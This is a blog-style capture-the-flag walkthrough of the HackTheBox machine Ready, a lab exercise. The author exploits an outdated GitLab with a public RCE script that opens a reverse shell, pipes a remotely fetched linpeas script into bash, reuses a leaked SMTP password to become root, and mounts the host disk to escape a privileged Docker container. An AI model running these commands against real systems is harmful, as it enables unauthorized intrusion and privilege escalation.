---
title: "Walk-through of Ready from HackTHeBox"
header:
  teaser: /assets/images/2021-05-11-22-16-18.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - GitLab
---

## Machine Information

![ready](/assets/images/2021-05-11-22-16-18.png)

Ready is rated as a medium machine on HackTheBox. We start by finding a vulnerable version of GitLab running on the server. We use a publicly available exploit to gain a reverse shell, and after some enumeration we discover credentials for the root user. With further enumeration we discover we are inside a docker container, and we use a simple well known technique to escape it and get to the underlying file system.

<!--more-->

Skills required are basic port enumeration and OS exploration knowledge. Skills learned are detecting and escaping docker containers.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Ready](https://www.hackthebox.eu/home/machines/profile/304) |
| Machine Release Date | 12th Dec 2021 |
| Date I Completed It | 9th May 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/ready]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.220 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/ready]
└─# nmap -p$ports -sC -sV -oA ready 10.10.10.220
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 20:54 BST
Nmap scan report for 10.10.10.220
Host is up (0.023s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds
```

We have just two open ports from our scan. SSH on port 22 is a non-starter for now, so let's look at nginx on port 5080 first. Before we do I'll add the box IP to our hosts file:

```text
┌──(root💀kali)-[~/thm/retro]
└─# echo 10.10.10.220 ready.htb >> /etc/hosts
```

Now browse to port 5080 and see what we find:

![ready-gitlab-login](/assets/images/2021-05-09-22-08-59.png)

A login page for a locally hosted version of GitLab. I Googled for default credentials but what I found didn't work.

Looking back at the nmap scan it also revealed there's a robots.txt file with a large number of entries:

![ready-robots.txt](/assets/images/2021-05-09-22-14-46.png)

I looked around some of those folders but found nothing interesting. Next I tried registering an account:

![ready-register](/assets/images/2021-05-09-22-20-11.png)

This works and I'm logged in as a standard user:

![ready-gitlab-dashboard](/assets/images/2021-05-09-22-26-30.png)

As a new user I have no access to any projects, and there is no public content to look at. I find the version of this installation on the help page:

![ready-help](/assets/images/2021-05-09-22-24-08.png)

I notice it says update asap, so this is probably our intended path. Let's check searchsploit:

```text
┌──(root💀kali)-[~/htb/ready]
└─# searchsploit gitlab 11.4.7
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                    | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)  | ruby/webapps/49257.py
----------------------------------------------------------- ---------------------------------
```

Two RCE exploits for our version of GitLab. Let's have a look at the first one:

```text
┌──(root💀kali)-[~/htb/ready]
└─# searchsploit -m 49334.py
  Exploit: GitLab 11.4.7 - RCE (Authenticated) (2)
      URL: https://www.exploit-db.com/exploits/49334
     Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
Copied to: /root/htb/ready/49334.py
```

Looking at the contents of the script I see it completely automates the RCE, I just have to give it the right parameters:

```text
parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE')
parser.add_argument('-u', help='GitLab Username/Email', required=True)
parser.add_argument('-p', help='Gitlab Password', required=True)
parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
parser.add_argument('-l', help='reverse shell ip', required=True)
parser.add_argument('-P', help='reverse shell port', required=True)
args = parser.parse_args()
```

I have a user name and password from earlier when I registered on the GitLab site. So now I can use those credentials with the exploit:

```text
┌──(root💀kali)-[~/htb/ready]
└─# python3 49334.py -u pencer -p password -g http://ready.htb -l 10.10.14.161 -P 49999
[+] authenticity_token: KCmgClgMqt/cuS4ieLAwWTjV+bs3DXzGj1EjOdz3sCqDu5p5aI/f50gST6003uCT5xxwjVA6ZGrHwUgLkbsDKg==
[+] Creating project with random name: project6058
[+] Running Exploit
[+] Exploit completed successfully!
```

Looks good. When I switch to my netcat listener I see we have a reverse shell connected:

```text
┌──(root💀kali)-[~/htb/ready]
└─# nc -nlvp 49999
listening on [any] 49999 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.10.220] 36876
```

Let's see who we are connected as:

```text
id
uid=998(git) gid=998(git) groups=998(git)
```

Now we need to upgrade to a better terminal:

```text
which bash
/bin/bash
which python3
/opt/gitlab/embedded/bin/python3

/opt/gitlab/embedded/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
git@gitlab:~/gitlab-rails/working$ ^Z
zsh: suspended  nc -nlvp 49999
┌──(root💀kali)-[~/htb/ready]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 49999
git@gitlab:~/gitlab-rails/working$ stty rows 52 cols 237
```

Ok, that's better. Let's see what users we have:

```text
git@gitlab:~/gitlab-rails/working$ ls -ls /home
4 drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 dude
```

There's a user called dude and we have rights to look in their home folder:

```text
git@gitlab:~/gitlab-rails/working$ ls -ls /home/dude
total 4
4 -r--r----- 1 dude git 33 Dec  2 10:46 user.txt
```

Just the user flag, which we also have rights to read so let's grab that before we move one:

```text
git@gitlab:~/gitlab-rails/working$ cat /home/dude/user.txt 
<HIDDEN>
```

I had a look round but didn't spot anything obvious, so time to bring on [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). Get the latest version:

```text
┌──(root💀kali)-[~/htb/ready]
└─# wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
--2021-05-10 23:01:09--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 339569 (332K) [text/plain]
Saving to: ‘linpeas.sh’
linpeas.sh                               100%[===============================================================>] 331.61K  --.-KB/s    in 0.1s    
2021-05-10 23:01:09 (3.26 MB/s) - ‘linpeas.sh’ saved [339569/339569]
```

Start a web server so I can get to it from the box:

```text
┌──(root💀kali)-[~/htb/ready]
└─# python3 -m http.server 80                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Switch to the box, pull file over and execute, save output to tmp folder to look at later:

```text
git@gitlab:/$ wget -O - http://10.10.14.161/linpeas.sh | bash > /dev/shm/output.txt
--2021-05-10 22:03:27--  http://10.10.14.161/linpeas.sh
Connecting to 10.10.14.161:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 339569 (332K) [text/x-sh]
Saving to: 'STDOUT'
-          63%[==============================>                               ] 210.99K   383KB/s
-         100%[=============================================================>] 331.61K  32.1KB/s    in 10s
2021-05-10 22:03:38 (32.1 KB/s) - written to stdout [339569/339569]
```

After looking through the file I find two interesting things. A password found in a backup folder:

```text
Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "<HIDDEN>"
```

And also that we are inside a Docker container:

```text
[+] AppArmor enabled? .............. AppArmor Not Found
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (docker)
[+] Is this a container? ........... Looks like we're in a Docker container
```

I tried the password with the user dude, but that didn't work. Then I tried it with root:

```text
git@gitlab:~/gitlab-rails/working$ su root
Password: 
root@gitlab:/var/opt/gitlab/gitlab-rails/working# id
uid=0(root) gid=0(root) groups=0(root)
```

Nice! We're root, that was almost too easy. Well as you expect it's not over yet, looking at the file system we have a root folder but no flag:

```text
root@gitlab:/var/opt/gitlab/gitlab-rails/working# ls -lsa /root
total 24
4 drwx------ 1 root root 4096 Dec 13 15:06 .
4 drwxr-xr-x 1 root root 4096 Dec  1 12:41 ..
0 lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -> /dev/null
4 -rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
4 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
4 drwx------ 2 root root 4096 Dec  7 16:49 .ssh
4 -rw------- 1 root root 1565 Dec 13 15:06 .viminfo
```

Then we remember we're inside a docker container. So we'll need to escape that to get to the underlying filesystem. Luckily LinPEAS has got a handy link for us in it's output:

```text
[+] Looking for docker breakout techniques
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+i
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_ownercap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=998(git)
gid=998(git)
groups=998(git)
```

Reading the information on hacktricks it says:

```text
Well configured docker containers won't allow command like fdisk -l. 
However on missconfigured docker command where the flag --privileged is specified, 
it is possible to get the privileges to see the host drive.
```

Let's try that:

```text
root@gitlab:/var/opt/gitlab/gitlab-rails/working# fdisk -l
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
```

Ok, well we can see the filesystem so this is looking good. Next it says:

```text
So to take over the host machine, it is trivial:
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
And voilà ! You can now acces the filesystem of the host because it is mounted in the /mnt/hola folder.
```

We simply create an empty folder and mount the filesystem to it. Let's try:

```text
root@gitlab:/var/opt/gitlab/gitlab-rails/working# cd /tmp
root@gitlab:/tmp# mkdir pencer
root@gitlab:/tmp# mount /dev/sda2 /tmp/pencer
root@gitlab:/tmp# cd pencer
root@gitlab:/tmp/pencer# ls -lsa
 4 drwxr-xr-x  20 root root  4096 Dec  7 17:44 .
 4 drwxrwxrwt   1 root root  4096 May 11 20:54 ..
 0 lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
 4 drwxr-xr-x   3 root root  4096 Jul  3  2020 boot
 4 drwxr-xr-x   2 root root  4096 May  7  2020 cdrom
 4 drwxr-xr-x   5 root root  4096 Dec  4 15:20 dev
 4 drwxr-xr-x 101 root root  4096 Feb 11 14:31 etc
 4 drwxr-xr-x   3 root root  4096 Jul  7  2020 home
16 drwx------   2 root root 16384 May  7  2020 lost+found
 4 drwxr-xr-x   2 root root  4096 Apr 23  2020 media
 4 drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
 4 drwxr-xr-x   3 root root  4096 Jun 15  2020 opt
 4 drwxr-xr-x   2 root root  4096 Apr 15  2020 proc
 4 drwx------  10 root root  4096 Dec  7 17:02 root
 4 drwxr-xr-x  10 root root  4096 Apr 23  2020 run
 0 lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
 4 drwxr-xr-x   6 root root  4096 May  7  2020 snap
 4 drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
 4 drwxr-xr-x   2 root root  4096 Apr 15  2020 sys
12 drwxrwxrwt  12 root root 12288 May 11 20:55 tmp
 4 drwxr-xr-x  14 root root  4096 Apr 23  2020 usr
 4 drwxr-xr-x  14 root root  4096 Dec  4 15:20 var
```

We can see the underlying file system is mounted in my folder. Let's look in the root folder:

```text
root@gitlab:/tmp/pencer# ls -lsa root/
4 drwx------ 10 root root 4096 Dec  7 17:02 .
4 drwxr-xr-x 20 root root 4096 Dec  7 17:44 ..
0 lrwxrwxrwx  1 root root    9 Jul 11  2020 .bash_history -> /dev/null
4 -rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
4 drwx------  2 root root 4096 May  7  2020 .cache
4 drwx------  3 root root 4096 Jul 11  2020 .config
4 -rw-r--r--  1 root root   44 Jul  8  2020 .gitconfig
4 drwxr-xr-x  3 root root 4096 May  7  2020 .local
0 lrwxrwxrwx  1 root root    9 Dec  7 17:02 .mysql_history -> /dev/null
4 -rw-r--r--  1 root root  161 Dec  5  2019 .profile
4 -rw-r--r--  1 root root   75 Jul 12  2020 .selected_editor
4 drwx------  2 root root 4096 Dec  7 16:49 .ssh
4 drwxr-xr-x  2 root root 4096 Dec  1 12:28 .vim
0 lrwxrwxrwx  1 root root    9 Dec  7 17:02 .viminfo -> /dev/null
4 drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
4 drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
4 -r--------  1 root root   33 Jul  8  2020 root.txt
4 drwxr-xr-x  3 root root 4096 May 18  2020 snap
```

At last we see the root flag. Let's grab it and we've made it to the end:

```text
root@gitlab:/tmp/pencer# cat root/root.txt
<HIDDEN>
```

All done. See you next time.
